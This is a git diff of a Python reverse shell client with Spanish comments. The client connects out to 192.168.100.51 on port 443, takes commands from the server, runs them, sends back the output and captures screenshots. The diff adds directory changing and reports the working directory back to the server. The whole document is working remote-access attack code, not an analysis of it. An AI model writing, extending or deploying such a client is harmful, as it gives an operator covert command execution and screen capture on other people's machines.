@@ -11,6 +11,9 @@ import subprocess
 import sys
 import signal
 import struct
+import os
+
+current_dir = os.getcwd()
 
 def signal_handler(sig, frame):
     print("\n[!] Exiting...")
@@ -61,14 +64,29 @@ if __name__ == '__main__':
     # Nos conectamos al servidor
     client_socket.connect(('192.168.100.51', 443))
     
+    client_socket.send(current_dir.encode())
 
     # Bucle infinito para recibir comandos
     while True:
+        
+        
         # Recibimos un mensaje del servidor
         command = client_socket.recv(2048).decode().strip()
         
         if command == "screenshot":
             send_screenshot(client_socket)
+        
+        elif command.startswith("cd "):
+            # Cambiamos el directorio de trabajo
+            # al directorio especificado
+            try:
+                os.chdir(command[3:])
+                pwd = os.getcwd()
+                # Enviamos el directorio actual al servidor
+                client_socket.send(pwd.encode())
+                
+            except Exception as e:
+                client_socket.send(b'\n[-] Error changing directory\n')
         else:
             # Pasamos el comando a la función run_command
             # que ejecutará el comando y devolverá la salida
@@ -78,6 +96,7 @@ if __name__ == '__main__':
             # Enviamos la salida del comando al servidor, para
             # ver la salida en la consola del servidor.
             client_socket.send(b'\n' + command_output.encode() + b'\n')
+        
     
             
     client_socket.close()
